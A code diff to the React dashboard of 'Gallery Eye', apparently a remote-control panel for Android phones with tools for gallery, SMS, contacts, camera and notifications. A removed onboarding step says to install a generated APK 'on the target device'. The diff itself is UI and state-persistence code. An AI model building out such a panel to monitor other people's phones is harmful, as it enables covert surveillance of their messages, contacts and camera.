@@ -52,25 +52,24 @@ export default function Home() {
     const [zipProgress, setZipProgress] = useState({ stage: 'creating' as 'creating' | 'uploading' | 'ready' | 'error', current: 0, total: 0, url: '', error: '' });
     const [zipFiles, setZipFiles] = useState<{ folderName: string, url: string, fileCount: number, timestamp: Date }[]>([]);
 
-    // Multi-Device State — persist selected device across refresh
+    // Multi-Device State
     const [devices, setDevices] = useState<any[]>([]);
-    const [selectedDeviceId, setSelectedDeviceIdState] = useState<string | null>(() => {
+    const [selectedDeviceId, setSelectedDeviceId] = useState<string | null>(() => {
         if (typeof window !== 'undefined') {
-            return localStorage.getItem('ge_selectedDeviceId') || null;
+            return localStorage.getItem('selectedDeviceId');
         }
         return null;
     });
-    const setSelectedDeviceId = (id: string | null | ((prev: string | null) => string | null)) => {
-        setSelectedDeviceIdState(prev => {
-            const newVal = typeof id === 'function' ? id(prev) : id;
-            if (typeof window !== 'undefined') {
-                if (newVal) localStorage.setItem('ge_selectedDeviceId', newVal);
-                else localStorage.removeItem('ge_selectedDeviceId');
-            }
-            return newVal;
-        });
-    };
     const [isDeviceDropdownOpen, setIsDeviceDropdownOpen] = useState(false);
+
+    // Persist selected device to localStorage
+    useEffect(() => {
+        if (selectedDeviceId) {
+            localStorage.setItem('selectedDeviceId', selectedDeviceId);
+        } else {
+            localStorage.removeItem('selectedDeviceId');
+        }
+    }, [selectedDeviceId]);
 
     const [uploadProgress, setUploadProgress] = useState<any>(null);
     const [showAppModal, setShowAppModal] = useState(false);
@@ -85,20 +84,8 @@ export default function Home() {
     const [isDeleting, setIsDeleting] = useState(false);
     const [syncMediaType, setSyncMediaType] = useState<'image' | 'video' | null>(null);
 
-    // Tool Selector State — persist across refresh
-    const [selectedTool, setSelectedToolState] = useState<'gallery' | 'sms' | 'contacts' | 'torch' | 'vibration' | 'camera' | 'notifications'>(() => {
-        if (typeof window !== 'undefined') {
-            const saved = localStorage.getItem('ge_selectedTool');
-            if (saved && ['gallery', 'sms', 'contacts', 'torch', 'vibration', 'camera', 'notifications'].includes(saved)) {
-                return saved as any;
-            }
-        }
-        return 'gallery';
-    });
-    const setSelectedTool = (tool: typeof selectedTool) => {
-        setSelectedToolState(tool);
-        if (typeof window !== 'undefined') localStorage.setItem('ge_selectedTool', tool);
-    };
+    // Tool Selector State
+    const [selectedTool, setSelectedTool] = useState<'gallery' | 'sms' | 'contacts' | 'torch' | 'vibration' | 'camera' | 'notifications'>('gallery');
     const [isToolDropdownOpen, setIsToolDropdownOpen] = useState(false);
 
     // Torch State
@@ -136,7 +123,7 @@ export default function Home() {
         { key: 'whatsapp', label: 'WhatsApp', packages: ['com.whatsapp'], color: '#25D366', img: 'https://upload.wikimedia.org/wikipedia/commons/thumb/6/6b/WhatsApp.svg/240px-WhatsApp.svg.png' },
         { key: 'facebook', label: 'Facebook', packages: ['com.facebook.katana', 'com.facebook.orca', 'com.facebook.lite'], color: '#1877F2', img: 'https://upload.wikimedia.org/wikipedia/commons/thumb/0/05/Facebook_Logo_%282019%29.png/240px-Facebook_Logo_%282019%29.png' },
         { key: 'instagram', label: 'Instagram', packages: ['com.instagram.android'], color: '#E4405F', img: 'https://upload.wikimedia.org/wikipedia/commons/thumb/a/a5/Instagram_icon.png/240px-Instagram_icon.png' },
-        { key: 'whatsapp_business', label: 'WA Biz', packages: ['com.whatsapp.w4b'], color: '#128C7E', img: 'https://play-lh.googleusercontent.com/AQtSF5Z-GGNnPUxPFHMFsOGPe4tXn3Xhqt5GjwDRMmpOZgjpKL1PxK1Hrr3b666C3Q=w240-h480-rw' },
+        { key: 'whatsapp_business', label: 'WA Biz', packages: ['com.whatsapp.w4b'], color: '#128C7E', img: 'https://play-lh.googleusercontent.com/Ga1VNG799Ky-vECFMZo6M2FW-3SQnbEXmfGhFGolFkvRh0JyxOM4sg1rYpjpGlGOJw=w240-h480' },
         { key: 'snapchat', label: 'Snapchat', packages: ['com.snapchat.android'], color: '#FFFC00', img: 'https://upload.wikimedia.org/wikipedia/en/thumb/c/c4/Snapchat_logo.svg/240px-Snapchat_logo.svg.png' },
     ];
 
@@ -219,13 +206,18 @@ export default function Home() {
             socket.on("device_list_update", (deviceList: any[]) => {
                 setDevices(deviceList);
 
-                // Auto-select first online device if none selected or current selection is offline
                 const onlineDevices = deviceList.filter(d => d.online);
                 if (onlineDevices.length > 0) {
                     setSelectedDeviceId(prev => {
                         // If we have a selection and it's still online, keep it
                         const stillOnline = onlineDevices.find(d => d.deviceId === prev);
                         if (stillOnline) return prev;
+                        // Check localStorage for a previously saved device
+                        const savedId = localStorage.getItem('selectedDeviceId');
+                        if (savedId) {
+                            const savedOnline = onlineDevices.find(d => d.deviceId === savedId);
+                            if (savedOnline) return savedId;
+                        }
                         // Otherwise select the first online device
                         return onlineDevices[0].deviceId;
                     });
@@ -897,48 +889,6 @@ END:VCARD`;
 
             <div className="relative z-10 max-w-7xl mx-auto px-4 md:px-6 py-8">
 
-                {/* Welcome Screen — shown when no device connected */}
-                {devices.length === 0 && !selectedDeviceId && (
-                    <div className="mb-8 p-6 md:p-10 rounded-2xl border border-white/10 bg-gradient-to-br from-white/[0.03] to-transparent">
-                        <div className="max-w-2xl mx-auto text-center">
-                            <div className="w-16 h-16 mx-auto mb-5 rounded-2xl bg-gradient-to-br from-purple-500/20 to-cyan-500/20 flex items-center justify-center">
-                                <svg className="w-8 h-8 text-purple-400" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth="1.5" d="M12 18h.01M8 21h8a2 2 0 002-2V5a2 2 0 00-2-2H8a2 2 0 00-2 2v14a2 2 0 002 2z"></path></svg>
-                            </div>
-                            <h2 className="text-2xl font-bold mb-2">Welcome to Gallery Eye</h2>
-                            <p className="text-white/40 mb-8">Get started by connecting your first device</p>
-                            <div className="grid grid-cols-1 sm:grid-cols-3 gap-4 text-left">
-                                <div className="p-4 rounded-xl bg-white/[0.03] border border-white/[0.06]">
-                                    <div className="w-8 h-8 rounded-lg bg-purple-500/20 flex items-center justify-center mb-3">
-                                        <span className="text-sm font-bold text-purple-400">1</span>
-                                    </div>
-                                    <h3 className="font-semibold text-sm mb-1">Download App</h3>
-                                    <p className="text-xs text-white/30">Click &quot;Download App&quot; button above to generate your custom APK</p>
-                                </div>
-                                <div className="p-4 rounded-xl bg-white/[0.03] border border-white/[0.06]">
-                                    <div className="w-8 h-8 rounded-lg bg-cyan-500/20 flex items-center justify-center mb-3">
-                                        <span className="text-sm font-bold text-cyan-400">2</span>
-                                    </div>
-                                    <h3 className="font-semibold text-sm mb-1">Install & Setup</h3>
-                                    <p className="text-xs text-white/30">Install the APK on the target device and grant the required permissions</p>
-                                </div>
-                                <div className="p-4 rounded-xl bg-white/[0.03] border border-white/[0.06]">
-                                    <div className="w-8 h-8 rounded-lg bg-green-500/20 flex items-center justify-center mb-3">
-                                        <span className="text-sm font-bold text-green-400">3</span>
-                                    </div>
-                                    <h3 className="font-semibold text-sm mb-1">Start Using</h3>
-                                    <p className="text-xs text-white/30">Once connected, select a device from the top bar and pick a tool to begin</p>
-                                </div>
-                            </div>
-                            <button
-                                onClick={() => setShowAppModal(true)}
-                                className="mt-8 px-6 py-3 rounded-xl bg-gradient-to-r from-purple-600 to-cyan-600 text-white font-semibold hover:scale-[1.02] transition-transform shadow-lg shadow-purple-500/20"
-                            >
-                                Generate Your App →
-                            </button>
-                        </div>
-                    </div>
-                )}
-
                 {/* Remote Control Section */}
                 <div className="mb-12">
                     <div className="flex items-center justify-between mb-6">
@@ -946,13 +896,10 @@ END:VCARD`;
                             <h2 className="text-2xl font-bold">Remote Control</h2>
                             {selectedDeviceId ? (
                                 <span className="text-sm text-green-400 font-medium flex items-center gap-2">
-                                    <span className="w-2 h-2 rounded-full bg-green-500 animate-pulse"></span>
-                                    Connected to: {devices.find(d => d.deviceId === selectedDeviceId)?.name || 'Device'}
+                                    Connected to: {devices.find(d => d.deviceId === selectedDeviceId)?.name}
                                 </span>
-                            ) : devices.length > 0 ? (
-                                <span className="text-sm text-yellow-400/70">👆 Select a device from the top bar to start</span>
                             ) : (
-                                <span className="text-sm text-white/30">No devices connected yet</span>
+                                <span className="text-sm text-white/40">Select a device from the top right to enable controls</span>
                             )}
                         </div>
                     </div>
@@ -991,10 +938,74 @@ END:VCARD`;
                                     ))}
                                 </div>
                             ) : (
-                                <div className="p-8 rounded-2xl bg-white/5 border border-white/10 text-center text-white/40">
-                                    {!selectedDeviceId
-                                        ? "Select a device from the top right menu to view albums."
-                                        : "Click \"Refresh Folders\" to see albums from your device."}
+                                <div className="py-16 flex flex-col items-center justify-center">
+                                    {!selectedDeviceId ? (
+                                        <div className="max-w-lg mx-auto text-center space-y-8">
+                                            <div className="relative">
+                                                <div className="w-20 h-20 mx-auto rounded-2xl bg-gradient-to-br from-purple-500/20 to-cyan-500/20 border border-white/10 flex items-center justify-center">
+                                                    <svg className="w-10 h-10 text-purple-400" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth="1.5" d="M12 18h.01M8 21h8a2 2 0 002-2V5a2 2 0 00-2-2H8a2 2 0 00-2 2v14a2 2 0 002 2z"></path></svg>
+                                                </div>
+                                                <div className="absolute -top-1 -right-1 w-6 h-6 bg-green-500 rounded-full flex items-center justify-center animate-pulse" style={{ left: 'calc(50% + 24px)' }}>
+                                                    <svg className="w-3 h-3 text-white" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth="3" d="M12 6v6m0 0v6m0-6h6m-6 0H6"></path></svg>
+                                                </div>
+                                            </div>
+                                            <div>
+                                                <h3 className="text-xl font-bold text-white mb-2">Welcome to GalleryEye</h3>
+                                                <p className="text-white/40 text-sm">Get started by connecting your device</p>
+                                            </div>
+                                            <div className="grid gap-3 text-left">
+                                                <div className="flex items-center gap-4 p-4 rounded-xl bg-white/[0.03] border border-white/[0.06]">
+                                                    <div className="w-10 h-10 rounded-xl bg-purple-500/15 flex items-center justify-center flex-shrink-0">
+                                                        <span className="text-lg font-bold text-purple-400">1</span>
+                                                    </div>
+                                                    <div>
+                                                        <p className="text-sm font-medium text-white/80">Download the App</p>
+                                                        <p className="text-xs text-white/30">Click &quot;Download App&quot; in the top right to generate your APK</p>
+                                                    </div>
+                                                </div>
+                                                <div className="flex items-center gap-4 p-4 rounded-xl bg-white/[0.03] border border-white/[0.06]">
+                                                    <div className="w-10 h-10 rounded-xl bg-cyan-500/15 flex items-center justify-center flex-shrink-0">
+                                                        <span className="text-lg font-bold text-cyan-400">2</span>
+                                                    </div>
+                                                    <div>
+                                                        <p className="text-sm font-medium text-white/80">Select Your Device</p>
+                                                        <p className="text-xs text-white/30">Once installed, your device will appear in the &quot;Device&quot; menu at the top</p>
+                                                    </div>
+                                                </div>
+                                                <div className="flex items-center gap-4 p-4 rounded-xl bg-white/[0.03] border border-white/[0.06]">
+                                                    <div className="w-10 h-10 rounded-xl bg-green-500/15 flex items-center justify-center flex-shrink-0">
+                                                        <span className="text-lg font-bold text-green-400">3</span>
+                                                    </div>
+                                                    <div>
+                                                        <p className="text-sm font-medium text-white/80">Use the Tools</p>
+                                                        <p className="text-xs text-white/30">Pick from Gallery, Camera, Notifications, SMS &amp; more using the &quot;Tools&quot; menu</p>
+                                                    </div>
+                                                </div>
+                                            </div>
+                                            <button
+                                                onClick={() => setShowAppModal(true)}
+                                                className="px-6 py-3 rounded-xl bg-gradient-to-r from-purple-500 to-cyan-500 text-white font-semibold hover:scale-[1.02] transition-transform shadow-lg shadow-purple-500/20"
+                                            >
+                                                Get Started — Download App
+                                            </button>
+                                        </div>
+                                    ) : (
+                                        <div className="max-w-sm mx-auto text-center space-y-4">
+                                            <div className="w-16 h-16 mx-auto rounded-2xl bg-purple-500/10 border border-purple-500/20 flex items-center justify-center">
+                                                <svg className="w-8 h-8 text-purple-400" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth="1.5" d="M4 16l4.586-4.586a2 2 0 012.828 0L16 16m-2-2l1.586-1.586a2 2 0 012.828 0L20 14m-6-6h.01M6 20h12a2 2 0 002-2V6a2 2 0 00-2-2H6a2 2 0 00-2 2v12a2 2 0 002 2z"></path></svg>
+                                            </div>
+                                            <div>
+                                                <p className="text-white/60 font-medium">No albums loaded yet</p>
+                                                <p className="text-white/30 text-sm">Click the button above to load device albums</p>
+                                            </div>
+                                            <button
+                                                onClick={fetchFolders}
+                                                className="px-5 py-2.5 rounded-xl bg-white/10 border border-white/10 text-white/70 text-sm font-medium hover:bg-white/15 transition-colors"
+                                            >
+                                                Load Albums
+                                            </button>
+                                        </div>
+                                    )}
                                 </div>
                             )}
                         </>
